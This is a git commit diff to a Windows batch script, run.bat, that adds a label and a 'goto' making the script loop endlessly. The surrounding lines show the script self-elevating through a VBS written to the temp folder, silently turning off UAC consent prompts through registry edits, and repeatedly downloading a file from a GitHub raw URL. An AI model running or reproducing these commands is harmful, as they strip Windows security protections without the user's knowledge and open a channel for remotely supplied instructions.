474e34aac76ec6909233042dfa9f4635e3764e71
mitutina <mitutina00@gmail.com>
2024-12-26 13:44:46 +0700

    Update run.bat

--- run.bat
+++ run.bat
@@ -3,7 +3,7 @@ set "params=%*"
 cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
-
+:loopp
 :: Tải file check.txt về %temp%
 set "url=https://raw.githubusercontent.com/mitutina/mitutina/main/check.txt"
 set "tempfile=%temp%\check.txt"
@@ -61,3 +61,4 @@ set "serial="
 set "device="
 set "found="
 echo Hoan Thanh
+goto loopp
